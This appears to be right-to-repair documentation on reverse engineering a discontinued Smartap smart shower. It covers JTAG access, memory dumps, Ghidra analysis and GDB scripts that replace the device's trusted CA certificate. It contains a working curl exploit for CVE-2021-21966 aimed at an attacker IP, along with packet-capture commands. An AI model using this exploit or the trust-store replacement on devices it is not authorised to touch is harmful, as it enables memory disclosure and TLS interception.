# Research Background: Reverse Engineering Journey

This document chronicles the complete journey of reverse engineering the Smartap smart shower system—from initial investigation through successful certificate replacement and device revival. This represents the deep technical foundation upon which this project is built.

## Overview

The Smartap smart shower system was a high-end IoT device that became completely cloud-dependent. When the manufacturer ceased trading and their cloud services went offline, these perfectly functional devices were reduced to basic manual operation, losing all their smart features.

!!! success "Major Breakthrough (November 2025)"
    Successfully replaced the device's CA certificate, enabling it to trust a custom certificate authority. This breakthrough allows the device to establish TLS connections to a custom server, effectively breaking free from the defunct cloud infrastructure.

## Background & Motivation

### The Device

The Smartap smart shower system was marketed through VictoriaPlumb (UK) for £695, boasting integration with:

- iOS and Android mobile apps
- Google Assistant
- Amazon Alexa
- IFTTT

**Key smart features included:**

- Remote shower pre-heating
- Multiple valve control for different shower heads/bath
- Temperature and pressure monitoring
- Usage analytics and scheduling

### The Problem

!!! danger "Cloud Dependency"
    While cloud dependency isn't universal or necessary for IoT devices, Smartap made their device entirely dependent on their cloud services. When the manufacturer ceased trading approximately a year ago, their cloud services disappeared, taking all the smart functionality with them.

The only locally operating service was a basic web server, primarily used for WiFi configuration:

```bash
curl http://192.168.99.10
```

```json
{
  "ssidList": ["MYSSID"],
  "lowPowerMode": false,
  "serial": "MYSERIALNUMBER",
  "dns": "smartap-tech.com",
  "port": 80,
  "outlet1": 1,
  "outlet2": 2,
  "outlet3": 4,
  "k3Outlet": true,
  "swVer": "0x355",
  "wnpVer": "2.:.0.000",
  "mac": "XX:XX:XX:XX:XX:XX",
  "oldAppVer": "pkey:0000,XXXXXXXXX"
}
```

### The Mission

By sharing this research, the goals are to:

- Provide valuable information to others facing similar challenges
- Create opportunities for collaboration and knowledge sharing
- Document the complete process from initial investigation to working solution
- Promote discussion about IoT device longevity and right-to-repair

## Initial Software Investigation

Before proceeding with hardware analysis, initial research focused on known vulnerabilities in the TI CC3200 SDK.

### Exploring CVE-2021-21966

The investigation centered on [CVE-2021-21966](https://nvd.nist.gov/vuln/detail/CVE-2021-21966), a memory disclosure vulnerability in the SDK's default web server implementation.

!!! info "The Vulnerability"
    The CC3200 SDK includes a default web page `ping.html` that provides ICMP ping functionality. This feature exists because the SDK ships with example code demonstrating network connectivity testing. Smartap appear to have left this feature enabled in their production firmware.

The vulnerability arises from improper bounds checking on the ICMP packet size parameter. When constructing an ICMP packet, the device:

1. Allocates a buffer based on the requested packet size
2. Copies data into this buffer to form the ICMP payload
3. Due to insufficient bounds checking, can be tricked into copying data from beyond the intended buffer

This was documented by Talos Intelligence: [TALOS-2021-1393](https://talosintelligence.com/vulnerability_reports/TALOS-2021-1393)

#### Exploitation Script

```bash
#!/bin/bash
ATTACKER_IP="192.168.99.250"
TARGET="192.168.99.10"
curl -i -s -k -X $'POST' \
-H $'Content-Length: 51' \
--data-binary $"__SL_P_T.A=${ATTACKER_IP}&__SL_P_T.B=1472&__SL_P_T.C=1" \
$"http://${TARGET}/ping.html"
```

To capture the resulting packets containing memory contents:

```bash
# On the attacker machine (192.168.99.250):
sudo tcpdump -i any -n -vv icmp and host 192.168.99.10 -w smartap_memory_leak.pcap
```

!!! warning "Limited Results"
    While this vulnerability successfully triggered memory disclosure from the device, analysis of the captured packets revealed no immediately useful information. The disclosed memory appeared to be from regions not containing sensitive data or code of interest.

This initial exploration demonstrated that while software vulnerabilities might provide some access to the device, a more direct hardware-based approach would be necessary to gain meaningful insights into the device's operation.

### Hardware Access Challenges

The CC3200 MCU ([Technical Documentation](https://www.ti.com/product/CC3200)) offers multiple interfaces (UART, SPI, I2C), but most are inaccessible in this device.

!!! info "CC3200 Security Features"
    The CC3200 SimpleLink Wi-Fi device provides the following security features:

    - Serial flash boot - Secure boot from serial flash
    - UART/SPI disabled by eFuse
    - Debug security - JTAG can be permanently disabled

    Source: CC3200 SimpleLink™ Wi-Fi® and IoT Solution with MCU LaunchPad Hardware User's Guide (SWRU372B)

Examining the board with the shielding removed reveals that accessing the MCU pins directly would be challenging. Most pins are either buried in internal layers of the PCB or are underneath the MCU in a BGA (Ball Grid Array) configuration.

## JTAG Access

### Hardware Connections

The initial breakthrough in accessing the device came from the Home Assistant community, where members documented and photographed the JTAG header locations on the board: [Home Assistant Discussion](https://community.home-assistant.io/t/smartap-shower-control-getting-started-with-reverse-engineering-a-smart-home-device/358251/206)

!!! tip "JTAG Port Location"
    The CC3200 wireless module contains a 6-pin unpopulated header arranged vertically. Pin 1 is marked with a "." symbol and has a "+" marking next to it.

**Pin Mapping:**

```
Smartap CC3200 Module              Raspberry Pi GPIO Header
=======================            ========================

    Pin 1  [●] +                   Not Connected
           │
    Pin 2  [ ]                     Pin 37 (GPIO 26) - TDO
           │
    Pin 3  [ ]                     Pin 33 (GPIO 13) - TCK
           │
    Pin 4  [ ]                     Pin 35 (GPIO 19) - TMS
           │
    Pin 5  [ ]                     Pin 31 (GPIO 6)  - TDI
           │
    Pin 6  [■] GND                 Pin 39 (GND)

    Legend:
    ● = Pin 1 marking (dot/+ symbol)
    ■ = Ground connection
    [ ] = Standard pin
```

**Connection Summary:**

- Smartap Pin 1: Not connected
- Smartap Pin 2: RPI Pin 37 (GPIO 26) - TDO
- Smartap Pin 3: RPI Pin 33 (GPIO 13) - TCK
- Smartap Pin 4: RPI Pin 35 (GPIO 19) - TMS
- Smartap Pin 5: RPI Pin 31 (GPIO 6) - TDI
- Smartap Pin 6: RPI Pin 39 (GND)

### Pin Enumeration with JTAGenum

To confirm the JTAG pin assignments, [JTAGenum](https://github.com/cyphunk/JTAGenum) was used on the Raspberry Pi. This tool systematically tests different pin combinations to identify JTAG interfaces.

User definitions added to the JTAGenum script:

```bash
... snip ...
# USER DEFINITIONS
    pins=(26 19 13 6 5)
pinnames=(26 19 13 6 5)
... snip ...
```

Running the scan:

```bash
root@pi:~/JTAGenum# source JTAGenum.sh
root@pi:~/JTAGenum# scan
================================
Starting scan for pattern: 0110011101001101101000010111001001
active  ntrst:6 tck:13 tms:19 tdo:26 tdi:5 bits toggled:3
active  ntrst:6 tck:13 tms:5 tdo:26 tdi:19 bits toggled:16
active  ntrst:5 tck:19 tms:6 tdo:26 tdi:13 bits toggled:2
FOUND!  ntrst:5 tck:13 tms:19 tdo:26 tdi:6 IR length: 6
active  ntrst:5 tck:13 tms:6 tdo:26 tdi:19 bits toggled:10
================================
```

!!! success "JTAG Interface Identified"
    The tool successfully identified the JTAG interface:

    - **nTRST**: GPIO 5
    - **TCK**: GPIO 13
    - **TMS**: GPIO 19
    - **TDO**: GPIO 26
    - **TDI**: GPIO 6
    - **IR Length**: 6

### Setting Up OpenOCD

With the JTAG pins identified, OpenOCD can be configured to communicate with the device. The setup requires two configuration files and uses the Raspberry Pi's GPIO pins as a JTAG adapter.

#### sysfsgpio-smartap.cfg

This file configures the Raspberry Pi's GPIO interface for JTAG communication:

```cfg
# Custom config for Smartap JTAG connection
# Based on JTAGenum results: ntrst:5 tck:13 tms:19 tdo:26 tdi:6
#

adapter driver sysfsgpio

# JTAG lines: tck tms tdi tdo
sysfsgpio jtag_nums 13 19 6 26

# Optional TRST
sysfsgpio trst_num 5

# Set a reasonable speed
adapter speed 100

# Reset config
reset_config trst_only
```

#### cc3200-complete.cfg

This file contains the CC3200-specific configuration, including the TAP ID and watchdog timer handling:

```cfg
# Combined CC3200 configuration with flash support

source [find target/swj-dp.tcl]
source [find target/icepick.cfg]

if { [info exists CHIPNAME] } {
    set _CHIPNAME $CHIPNAME
} else {
    set _CHIPNAME cc32xx
}

if { [info exists DAP_TAPID] } {
    set _DAP_TAPID $DAP_TAPID
} else {
    if {[using_jtag]} {
        set _DAP_TAPID 0x4BA00477
    } else {
        set _DAP_TAPID 0x2BA01477
    }
}

if {[using_jtag]} {
    jtag newtap $_CHIPNAME cpu -irlen 4 -ircapture 0x1 -irmask 0xf -expected-id $_DAP_TAPID -disable
    jtag configure $_CHIPNAME.cpu -event tap-enable "icepick_c_tapenable $_CHIPNAME.jrc 0"
} else {
    swj_newdap $_CHIPNAME cpu -expected-id $_DAP_TAPID
}

if { [info exists JRC_TAPID] } {
    set _JRC_TAPID $JRC_TAPID
} else {
    set _JRC_TAPID 0x0B97C02F
}

if {[using_jtag]} {
    jtag newtap $_CHIPNAME jrc -irlen 6 -ircapture 0x1 -irmask 0x3f -expected-id $_JRC_TAPID -ignore-version
    jtag configure $_CHIPNAME.jrc -event setup "jtag tapenable $_CHIPNAME.cpu"
}

set _TARGETNAME $_CHIPNAME.cpu
dap create $_CHIPNAME.dap -chain-position $_CHIPNAME.cpu
target create $_TARGETNAME cortex_m -dap $_CHIPNAME.dap

if { [info exists WORKAREASIZE] } {
    set _WORKAREASIZE $WORKAREASIZE
} else {
    set _WORKAREASIZE 0x2000
}

$_TARGETNAME configure -work-area-phys 0x20000000 -work-area-size $_WORKAREASIZE -work-area-backup 0

# Watchdog handling
$_TARGETNAME configure -event halted {
    echo "Extending watchdog timer..."
    mww 0x40000C00 0x1ACCE551
    mww 0x40000000 0xFFFFFFFF
    mww 0x40000C00 0x00000000
    echo "Watchdog timer extended to maximum"
}

$_TARGETNAME configure -event reset-end {
    echo "Extending watchdog after reset..."
    mww 0x40000C00 0x1ACCE551
    mww 0x40000000 0xFFFFFFFF
    mww 0x40000C00 0x00000000
}
```

!!! warning "Watchdog Timer Handling"
    The watchdog timer handling is particularly important. Without it, the device would reset during debugging sessions, interrupting any analysis or memory operations.

#### Running OpenOCD

With both configuration files in place, OpenOCD can be started:

```bash
openocd -f ./sysfsgpio-smartap.cfg -c "transport select jtag" -c "bindto 0.0.0.0" -f ./cc3200-complete.cfg
```

This command:

- Loads the GPIO interface configuration
- Selects JTAG as the transport protocol
- Binds to all network interfaces (allowing remote GDB connections)
- Loads the CC3200-specific configuration

Once running, OpenOCD provides:

- A telnet interface on port 4444 for direct commands
- A GDB server on port 3333 for debugging

## Memory Analysis

### Initial Memory Dump

Using OpenOCD's debugging interface, the device's SRAM could be dumped for analysis:

```bash
# Connect to OpenOCD's debugger interface
telnet localhost 4444

# Halt the CPU and dump memory
> halt
[cc32xx.cpu] halted due to debug-request, current mode: Thread
xPSR: 0x61000000 pc: 0x2001a328 psp: 0x20031cf0
> dump_image sram-dump-001.bin 0x20004000 0x20037000
```

### Analysis of Memory Contents

Initial analysis of the memory dump using the `strings` command revealed several interesting patterns:

**1. SSL Certificate References:**

```
/cert/129.der
/cert/130.der
/cert/131.der
```

**2. Domain Validation Strings:**

```
smartap-tech.com
Host: eValve.smartap-tech.com
```

**3. Error Handling Related to SSL:**

```
http_connect_server: ERROR SL_SO_SECMETHOD, status=%d
http_connect_server: ERROR SL_SO_SECURE_FILES_CERTIFICATE_FILE_NAME, status=%d
http_connect_server: ERROR SL_SO_SECURE_FILES_PRIVATE_KEY_FILE_NAME, status=%d
http_connect_server: ERROR SO_SECURE_DOMAIN_NAME_VERIFICATION, status=%d
```

!!! tip "Key Discovery"
    These strings provided the first clues about how the device validates SSL connections and where certificates are stored.

### Binary Analysis with Ghidra

After obtaining the memory dump, Ghidra was used to understand the code structure and identify interesting functions.

The memory dump was loaded into Ghidra starting at address `0x20004000`, which represents the base address where the code was executing in the device's memory space.

!!! info "Base Address Significance"
    This base address is crucial as it serves as the reference point for all function offsets in the subsequent analysis and GDB scripts.

Using Ghidra's decompilation capabilities, it was possible to identify and analyze key functions related to SSL certificate validation and network communication.

For example, when a GDB script references `$BASE_OFFSET + 0x12800`, this maps to the actual memory address `0x20016800` on the device, where one of the main SSL validation routines was identified through Ghidra's analysis.

### SSL Validation Analysis

The investigation revealed three distinct security checks in the device's SSL validation process. Interestingly, the implementation closely follows TI's SSL example code from the CC3200 SDK, but with modifications to the certificate validation approach.

**1. Domain Name Verification**

- Checks for the string "smartap.com" in the certificate's CN field
- Uses a simple string match, looking for the presence of this string anywhere within the CN
- This appears to be a modification of TI's example domain verification which uses `SL_SO_SECURE_DOMAIN_NAME_VERIFICATION`

**2. Certificate Chain Validation**

- Multiple certificate files are checked (129.der, 130.der, 131.der)
- The validation process verifies the entire certificate chain
- The naming convention matches TI's example SSL code which uses "client.der", "ca.der" for certificates
- The error messages found in memory (`SL_SO_SECURE_FILES_CERTIFICATE_FILE_NAME`) correspond to TI's documented SSL constants

**3. Additional Security Checks**

- Several other security-related validations at the socket level
- These include method verification and private key validation
- The implementation uses TI's SimpleLink socket options like `SL_SO_SECMETHOD`, `SL_SO_SECURE_MASK`

!!! note "TI SDK Correlation"
    This correlation with TI's example code provides additional confidence in the analysis of the security implementation and potential modification points.

    Reference: [TI CC3200 SSL Example](https://software-dl.ti.com/ecs/CC3200SDK/1_5_0/exports/cc3200-sdk/example/ssl/README.html)

## Breaking the Certificate Trust Chain

### Understanding the Certificate Store

The memory analysis revealed three certificate files stored on the device's filesystem:

- **129.der** - COMODO RSA Domain Validation Secure Server CA (intermediate certificate)
- **130.der** - Client public key for mutual TLS authentication
- **131.der** - Client private key for mutual TLS authentication

!!! info "Client Keys"
    The client keys (130.der and 131.der) appear to be static across all Smartap devices, likely used for mutual TLS authentication with the cloud service. As it turns out, the device doesn't enforce mutual TLS, so these weren't critical to the connection process.

!!! success "The Breakthrough"
    The real breakthrough was understanding that **129.der** is the CA certificate that the device trusts. If this could be replaced with a custom CA certificate, the device would trust any server certificate signed by that CA.

### Identifying Filesystem Functions

The key to replacing the certificate was identifying the filesystem functions in the device's memory. The CC3200 uses TI's SimpleLink API for file operations.

By examining the [CC3200 SDK source code](https://github.com/moyanming/CC3200SDK_1.2.0/tree/master/cc3200-sdk), the function signatures could be identified for:

- `sl_FsOpen` - Opens or creates a file
- `sl_FsRead` - Reads data from a file
- `sl_FsWrite` - Writes data to a file
- `sl_FsClose` - Closes a file
- `sl_FsDel` - Deletes a file

By comparing the SDK source code function signatures with the decompiled code in Ghidra, these functions were located in the memory dump at specific addresses:

```
sl_FsOpen  = 0x20015c64
sl_FsWrite = 0x20014bf8
sl_FsClose = 0x2001555c
sl_FsDel   = 0x20016ea8
```

!!! tip "Direct Function Calls"
    Having access to these functions means GDB can be used to call these functions directly, manipulating the filesystem while the device is halted via JTAG.

First, these functions were used to read the existing certificates from the device, confirming their contents and validating that the function addresses were correct. Once verified, the same functions could be used to delete the old CA certificate and write a new one.

### The Original Production Certificate

Before creating a replacement certificate, the original certificate used by the Smartap cloud service was examined. The certificate details were available from [crt.sh](https://crt.sh/?id=6715786779).

**Key details from the original certificate:**

```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            36:6c:fc:94:12:96:69:bd:95:6d:71:f0:c7:79:5a:3c
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: (CA ID: 1455)
            commonName                = COMODO RSA Domain Validation Secure Server CA
            organizationName          = COMODO CA Limited
            localityName              = Salford
            stateOrProvinceName       = Greater Manchester
            countryName               = GB
        Validity (Expired)
            Not Before: May 12 00:00:00 2022 GMT
            Not After : Jun 12 23:59:59 2023 GMT
        Subject:
            commonName                = *.smartap-tech.com
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
        X509v3 extensions:
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            X509v3 Basic Constraints: critical
                CA:FALSE
            X509v3 Extended Key Usage:
                TLS Web Server Authentication, TLS Web Client Authentication
            X509v3 Subject Alternative Name:
                DNS:*.smartap-tech.com
                DNS:smartap-tech.com
```

The wildcard certificate (`*.smartap-tech.com`) was signed by the COMODO intermediate CA, which was stored as 129.der on the device. To create a functionally equivalent setup, the replacement certificate would need to match this structure.

## Creating a Custom Certificate Authority

### Generating the CA and Server Certificates

The first step was creating a custom Certificate Authority and generating server certificates signed by that CA.

Certificate generation script:

```bash
#!/bin/bash
# Generate Custom CA and Certificates for Smartap Device
# This script creates all certificates needed for the custom CA setup

set -e

CERT_DIR="custom-certs"
DAYS_ROOT=3650    # 10 years for root CA
DAYS_SERVER=730   # 2 years for server cert

echo "=== Smartap Custom Certificate Generation ==="
echo ""

# Create directory for certificates
mkdir -p "$CERT_DIR"
cd "$CERT_DIR"

echo "[1/4] Generating Root CA..."
echo "  Creating private key..."

# Generate Root CA private key
openssl genrsa -out ca-root-key.pem 4096 2>/dev/null

echo "  Creating Root CA certificate..."

# Create Root CA certificate
openssl req -new -x509 -days "$DAYS_ROOT" -key ca-root-key.pem -out ca-root-cert.pem \
  -subj "/C=GB/ST=England/L=London/O=Smartap/CN=Smartap Root CA" \
  -addext "basicConstraints=critical,CA:TRUE" \
  -addext "keyUsage=critical,keyCertSign,cRLSign" \
  -addext "subjectKeyIdentifier=hash"

echo "  Converting Root CA to DER format..."
openssl x509 -in ca-root-cert.pem -out ca-root-cert.der -outform DER

ROOT_SIZE=$(wc -c < ca-root-cert.der)
echo "  Root CA certificate: ca-root-cert.der ($ROOT_SIZE bytes)"

echo ""
echo "[2/4] Generating Server Private Key..."
openssl genrsa -out server-key.pem 2048 2>/dev/null

echo ""
echo "[3/4] Creating Server Certificate Signing Request..."

# Create server CSR with correct domain
openssl req -new -key server-key.pem -out server.csr \
  -subj "/C=GB/ST=England/L=London/O=Smartap/CN=eValve.smartap-tech.com"

echo ""
echo "[4/4] Signing Server Certificate..."

# Create extension file for SAN
cat > server-ext.cnf << EOF
basicConstraints = CA:FALSE
keyUsage = digitalSignature, keyEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names

[alt_names]
DNS.1 = eValve.smartap-tech.com
DNS.2 = smartap-tech.com
EOF

# Sign server certificate
openssl x509 -req -in server.csr -CA ca-root-cert.pem -CAkey ca-root-key.pem \
  -CAcreateserial -out server-cert.pem -days "$DAYS_SERVER" \
  -extfile server-ext.cnf 2>/dev/null

# Create full chain (server cert + CA cert)
cat server-cert.pem ca-root-cert.pem > server-fullchain.pem

echo ""
echo "=== Certificate Generation Complete ==="
echo ""
echo "Files created in $CERT_DIR/:"
echo "  ca-root-key.pem       - Root CA private key (KEEP SECURE!)"
echo "  ca-root-cert.pem      - Root CA certificate (PEM)"
echo "  ca-root-cert.der      - Root CA certificate (DER) ← UPLOAD TO DEVICE"
echo "  server-key.pem        - Server private key (for nginx)"
echo "  server-cert.pem       - Server certificate"
echo "  server-fullchain.pem  - Server cert + CA chain (for nginx)"
```

This script creates:

1. A custom root CA with a 4096-bit RSA key
2. A server certificate for `eValve.smartap-tech.com` with appropriate Subject Alternative Names
3. A DER-formatted version of the CA certificate (ready for upload to the device)
4. A full certificate chain for use with nginx or other web servers

### Creating a Wildcard Certificate

To more closely match the original production certificate format, a wildcard certificate can be generated:

```bash
#!/bin/bash
set -e

echo "=== Regenerating Server Certificate with Wildcard CN ==="
echo "Matching original production certificate format"
echo

# Use existing Root CA
if [ ! -f "ca-root-key.pem" ] || [ ! -f "ca-root-cert.pem" ]; then
    echo "Error: Root CA files not found!"
    exit 1
fi

# Generate new server key (2048-bit for compatibility)
echo "[1/4] Generating new server private key..."
openssl genrsa -out server-key-wildcard.pem 2048

# Create CSR with wildcard CN (matching original cert)
echo "[2/4] Creating Certificate Signing Request with wildcard CN..."
openssl req -new -key server-key-wildcard.pem -out server-wildcard.csr \
  -subj "/C=GB/ST=England/L=London/O=Smartap/CN=*.smartap-tech.com"

# Create extension file for SAN
echo "[3/4] Creating certificate extensions..."
cat > server-wildcard-ext.cnf << 'EXTEOF'
basicConstraints = CA:FALSE
keyUsage = digitalSignature, keyEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names

[alt_names]
DNS.1 = *.smartap-tech.com
DNS.2 = smartap-tech.com
DNS.3 = eValve.smartap-tech.com
EXTEOF

# Sign with Root CA (using sha256 to match production)
echo "[4/4] Signing server certificate with Root CA..."
openssl x509 -req -in server-wildcard.csr \
  -CA ca-root-cert.pem \
  -CAkey ca-root-key.pem \
  -CAcreateserial \
  -out server-cert-wildcard.pem \
  -days 730 \
  -sha256 \
  -extfile server-wildcard-ext.cnf

# Create full chain for nginx
cat server-cert-wildcard.pem ca-root-cert.pem > server-fullchain-wildcard.pem

echo
echo "=== Files Created ==="
echo "  server-key-wildcard.pem         - Server private key"
echo "  server-cert-wildcard.pem        - Server certificate with CN=*.smartap-tech.com"
echo "  server-fullchain-wildcard.pem   - Full chain for nginx"
```

This wildcard certificate (`CN=*.smartap-tech.com`) matches the structure of the original production certificate, ensuring maximum compatibility with the device's validation logic.

### Deploying Certificates to the Device

With the CA certificate created, the final step was deploying it to the device. This required a script that would:

1. Convert the certificate to DER format
2. Generate a GDB script to manipulate the device's filesystem
3. Delete the old certificate (129.der)
4. Create a new file with the appropriate mode flags
5. Write the new certificate data
6. Close the file and resume device operation

Certificate replacement script:

```bash
#!/bin/bash
# Reusable Certificate Replacement Script
# Generates GDB script to replace /cert/129.der with any certificate
#
# Usage: ./replace-certificate.sh <path-to-certificate.der>

set -e

if [ $# -ne 1 ]; then
    echo "Usage: $0 <certificate.der>"
    echo "Example: $0 ../certs/my-custom-ca.der"
    exit 1
fi

CERT_FILE="$1"

if [ ! -f "$CERT_FILE" ]; then
    echo "Error: Certificate file not found: $CERT_FILE"
    exit 1
fi

CERT_SIZE=$(wc -c < "$CERT_FILE")
echo "Certificate file: $CERT_FILE"
echo "Certificate size: $CERT_SIZE bytes"

# Calculate mode based on TI SDK formula
# granTable = {256, 1024, 4096, 16384, 65536}
# For files < 64KB, use 256-byte granularity (granIdx=0)
GRAN_SIZE=256
GRAN_IDX=0
SIZE_BLOCKS=$(( ($CERT_SIZE + $GRAN_SIZE - 1) / $GRAN_SIZE ))
ACCESS_MODE=3  # _FS_MODE_OPEN_WRITE_CREATE_IF_NOT_EXIST
FLAGS=0x5      # COMMIT | NO_SIGNATURE_TEST

# Calculate mode: (Access << 12) | (SizeGran << 8) | (Size << 0) | (Flags << 16)
MODE=$(printf "0x%x" $(( ($ACCESS_MODE << 12) | ($GRAN_IDX << 8) | $SIZE_BLOCKS | ($FLAGS << 16) )))

echo "Mode calculation:"
echo "  Granularity: $GRAN_SIZE bytes (index $GRAN_IDX)"
echo "  Size blocks: $SIZE_BLOCKS"
echo "  Access mode: $ACCESS_MODE"
echo "  Flags: $FLAGS"
echo "  Encoded mode: $MODE"

OUTPUT_SCRIPT="replace-cert-$(date +%Y%m%d-%H%M%S).gdb"

cat > "$OUTPUT_SCRIPT" << 'EOF'
# Certificate Replacement Script
# Generated by replace-certificate.sh
#
# Filesystem functions:
# sl_FsOpen  = 0x20015c64
# sl_FsWrite = 0x20014bf8
# sl_FsClose = 0x2001555c
# sl_FsDel   = 0x20016ea8

target remote 172.16.80.207:3333

set pagination off
set $work_buffer = 0x20030000
set $file_handle_ptr = 0x20031000
set $filename_ptr = 0x20031004
set $token_ptr = 0x20031020
EOF

echo "set \$cert_size = $CERT_SIZE" >> "$OUTPUT_SCRIPT"
echo "" >> "$OUTPUT_SCRIPT"

cat >> "$OUTPUT_SCRIPT" << 'EOF'
printf "\n=== Certificate Replacement ===\n\n"

# Halt device
printf "[1/6] Halting device...\n"
monitor halt
shell sleep 0.5

# Setup filename: /cert/129.der
printf "[2/6] Setting up filename...\n"
set *(char*)($filename_ptr+0)  = 0x2f
set *(char*)($filename_ptr+1)  = 0x63
set *(char*)($filename_ptr+2)  = 0x65
set *(char*)($filename_ptr+3)  = 0x72
set *(char*)($filename_ptr+4)  = 0x74
set *(char*)($filename_ptr+5)  = 0x2f
set *(char*)($filename_ptr+6)  = 0x31
set *(char*)($filename_ptr+7)  = 0x32
set *(char*)($filename_ptr+8)  = 0x39
set *(char*)($filename_ptr+9)  = 0x2e
set *(char*)($filename_ptr+10) = 0x64
set *(char*)($filename_ptr+11) = 0x65
set *(char*)($filename_ptr+12) = 0x72
set *(char*)($filename_ptr+13) = 0x00

# Load certificate data
printf "[3/6] Loading certificate to memory...\n"
EOF

echo "restore $CERT_FILE binary (\$work_buffer)" >> "$OUTPUT_SCRIPT"

cat >> "$OUTPUT_SCRIPT" << 'EOF'
printf "Loaded %d bytes\n", $cert_size

# Delete old certificate (if exists)
printf "\n[4/6] Deleting old certificate...\n"
set $r0 = $filename_ptr
set $r1 = 0
set $pc = 0x20016ea8
set $lr = 0x20000001
set $sp = 0x20031d00
finish
printf "Delete result: %d (0=success, -11=not found)\n", $r0

# Create new file
printf "\n[5/6] Creating new certificate file...\n"
EOF

echo "set \$mode = $MODE" >> "$OUTPUT_SCRIPT"

cat >> "$OUTPUT_SCRIPT" << 'EOF'
printf "Using mode: 0x%x\n", $mode
set $r0 = $filename_ptr
set $r1 = $mode
set $r2 = $token_ptr
set $r3 = $file_handle_ptr
set $pc = 0x20015c64
set $lr = 0x20000001
set $sp = 0x20031d00
finish

if ($r0 != 0)
    printf "ERROR: Failed to create file (result: %d)\n", $r0
    quit
end

set $handle = *(int*)$file_handle_ptr
printf "File created! Handle: 0x%08x\n", $handle

# Write certificate data
printf "\n[6/6] Writing certificate data...\n"
set $r0 = $handle
set $r1 = 0
set $r2 = $work_buffer
set $r3 = $cert_size
set $pc = 0x20014bf8
set $lr = 0x20000001
finish

if ($r0 != $cert_size)
    printf "ERROR: Write failed (wrote %d, expected %d)\n", $r0, $cert_size
end

printf "Wrote %d bytes\n", $r0

# Close file
set $r0 = $handle
set $r1 = 0
set $r2 = 0
set $r3 = 0
set $pc = 0x2001555c
set $lr = 0x20000001
finish
printf "Close result: %d\n", $r0

printf "\n=== Certificate Replacement Complete ===\n"
printf "Resuming device...\n"
continue &

detach
quit
EOF

echo ""
echo "Generated: $OUTPUT_SCRIPT"
echo ""
echo "To execute:"
echo "  arm-none-eabi-gdb -batch -x $OUTPUT_SCRIPT"
echo ""
```

!!! info "How It Works"
    This script takes care of several critical aspects:

    1. **Mode Calculation**: The TI filesystem uses a complex mode parameter that encodes the access mode, file size granularity, and flags. The script calculates this automatically based on the certificate size.

    2. **Direct Function Calls**: By setting the program counter (`$pc`) to the address of filesystem functions and setting up registers with the appropriate parameters, the script can call these functions directly from GDB.

    3. **Memory Management**: The script uses unused areas of RAM (0x20030000+) as working buffers for the filename and certificate data.

    4. **Error Handling**: Each operation checks return values and reports errors, making debugging easier.

Running this script successfully replaces the CA certificate on the device. After a reboot, the device now trusts certificates signed by the custom CA, allowing it to establish TLS connections to a custom server.

## GDB Investigation and Script Development

!!! note "Historical Context"
    This section describes historical research that was conducted before the certificate replacement breakthrough. While these techniques didn't directly lead to the solution, they were valuable learning experiences and demonstrate alternative approaches to reverse engineering.

### Key Functions Identified

Memory analysis and debugging revealed several critical functions:

```
- FUN_000139d4: Socket creation/operations
- FUN_0001190c: Certificate loading/processing
- FUN_00012800: SSL/TLS operations
- FUN_0000b354: Global data access
- FUN_0000edcc: SSL/TLS data sending
- FUN_00010298: SSL/TLS data sending (alternate)
- FUN_00012b90: SSL/TLS data receiving
- FUN_00014580: SSL/TLS connection closure
```

### GDB Scripting

Here's a GDB script that was developed while investigating the SSL checks:

```gdb
# Set base memory offset
set $BASE_OFFSET = 0x20004000

# Load custom commands
source ./commands.gdb

# Certificate Loading Function (0x1190C)
break *($BASE_OFFSET + 0x1190C)
commands
  silent
  printf "Function: Certificate Loading\n"
  printf "Parameters:\n"
  printf "R0 (Certificate Path): %s\n", (char*)$r0
  printf "R1 (Flags): 0x%x\n", $r1
  # Monitor but don't modify
  continue
end

# SSL/TLS Operations (0x12800)
break *($BASE_OFFSET + 0x12800)
commands
  silent
  printf "Function: SSL/TLS Operation\n"
  printf "Operation Type: %d\n", $r1
  # Log parameters and stack
  x/10x $sp
  continue
end

# Domain Verification
break *($BASE_OFFSET + 0x14a30)
commands
  silent
  printf "Domain Verification Check\n"
  printf "Target Domain: %s\n", (char*)$r1
  continue
end

# Enhanced logging for error paths
break *($BASE_OFFSET + 0x10f2c)
commands
  silent
  printf "Error Logger Called\n"
  printf "Error Message: %s\n", (char*)$r0
  printf "Error Code: %d\n", $r1
  backtrace
  continue
end
```

### Research Challenges

The GDB debugging efforts detailed above represent work in progress. Several challenges were encountered during this phase of research:

**Watchdog Timer Interruptions**

- The device's watchdog timer frequently triggered during debugging sessions
- These interruptions would cause the device to reboot, disrupting analysis
- Each reboot required re-establishing JTAG connections and restarting debugging sessions
- This was eventually resolved in the OpenOCD configuration by extending the watchdog timer on halt events

**Incomplete Understanding**

- While the SSL validation process was partially understood, the real breakthrough came from identifying the filesystem functions rather than trying to patch the validation logic
- Some memory regions and function purposes remain unclear
- The approach of directly modifying certificates proved more practical than attempting to bypass validation

## Research Status

### Major Breakthrough: Certificate Replacement

This week's work represents a significant milestone in the Smartap reverse engineering project. By successfully replacing the device's CA certificate, the fundamental barrier to device revival has been overcome.

!!! success "What This Enables"
    1. The device can now establish TLS connections to a custom server
    2. Smart features can potentially be restored through a custom implementation
    3. The device is no longer dependent on the defunct cloud infrastructure
    4. Full protocol reverse engineering can proceed with live device communication

### Current Status

**Completed:**

- ✅ JTAG access established
- ✅ Memory dump and analysis
- ✅ SSL validation process understood
- ✅ Filesystem functions identified
- ✅ CA certificate successfully replaced
- ✅ TLS connections to custom server working
- ✅ Basic WebSocket communication established

**In Progress:**

- 🔄 Complete protocol documentation
- 🔄 Full message parsing and handling
- 🔄 Smart feature implementation
- 🔄 User interface development

### Community Contributions

This research is being shared to help others who:

1. Own similar devices and want to understand their options
2. Are interested in IoT device security research
3. Want to learn about reverse engineering techniques
4. Are concerned about cloud dependency in IoT devices

Contributions, suggestions, and improvements to this research are welcome. Please feel free to:

- Open issues for questions or suggestions
- Submit pull requests with improvements
- Share your own experiences with similar devices
- Propose additional areas for investigation
- Contribute to the Smartap Server project

## References

### Texas Instruments Documentation

- [CC3200 Product Page](https://www.ti.com/product/CC3200)
- [SimpleLink™ Wi-Fi® SDK](https://software-dl.ti.com/ecs/CC3200SDK/1_5_0/exports/cc3200-sdk/example/ssl/README.html)
